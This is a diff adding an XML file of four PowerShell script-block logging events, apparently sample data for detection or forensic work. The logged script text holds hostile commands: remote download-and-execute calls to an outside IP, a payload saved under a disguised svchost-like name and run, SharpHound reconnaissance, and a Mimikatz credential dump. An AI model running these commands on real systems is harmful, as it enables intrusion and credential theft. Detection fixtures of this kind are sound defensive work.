@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2024-03-15T16:47:55.000000000Z"/>
+    <EventRecordID>1025</EventRecordID>
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">iex (New-Object Net.WebClient).DownloadString(&quot;http://185.220.101.45/stager.ps1&quot;)</Data>
+    <Data Name="ScriptBlockId">a3f9e2b1-c4d5-6789-abcd-ef0123456789</Data>
+    <Data Name="Path"></Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2024-03-15T16:48:02.000000000Z"/>
+    <EventRecordID>1026</EventRecordID>
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">$url=&quot;http://185.220.101.45/payload.exe&quot;; $out=&quot;$env:TEMP\svchost32.exe&quot;; (New-Object Net.WebClient).DownloadFile($url,$out); Start-Process $out -ArgumentList &quot;-install&quot;</Data>
+    <Data Name="ScriptBlockId">b5e8f3c2-d7a1-4823-bcde-f1234567890a</Data>
+    <Data Name="Path"></Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2024-03-15T17:03:05.000000000Z"/>
+    <EventRecordID>1027</EventRecordID>
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://185.220.101.45/SharpHound.ps1&quot;); Invoke-BloodHound -CollectionMethod All</Data>
+    <Data Name="ScriptBlockId">c6f9a4d3-e8b2-5934-cdef-012345678901</Data>
+    <Data Name="Path"></Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2024-03-15T17:20:11.000000000Z"/>
+    <EventRecordID>1028</EventRecordID>
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">sekurlsa::logonpasswords</Data>
+    <Data Name="ScriptBlockId">d7a0b5e4-f9c3-6045-def0-123456789012</Data>
+    <Data Name="Path"></Data>
+  </EventData>
+</Event>
+</Events>
